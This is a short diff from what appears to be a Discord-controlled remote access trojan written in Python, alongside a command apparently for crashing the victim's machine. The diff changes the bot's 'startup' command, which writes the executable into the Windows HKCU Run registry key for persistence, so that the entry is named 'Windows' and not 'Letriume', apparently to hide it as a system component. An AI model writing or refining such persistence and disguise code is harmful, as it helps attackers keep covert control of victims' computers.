@@ -203,7 +203,7 @@ async def bsod(ctx):
 
 @bot.command()
 async def startup(ctx):
-    os.system(f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "Letriume" /t REG_SZ /d "{sys.executable}" /f')
+    os.system(f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "Windows" /t REG_SZ /d "{sys.executable}" /f')
     await ctx.send("success")
 
 @bot.command()
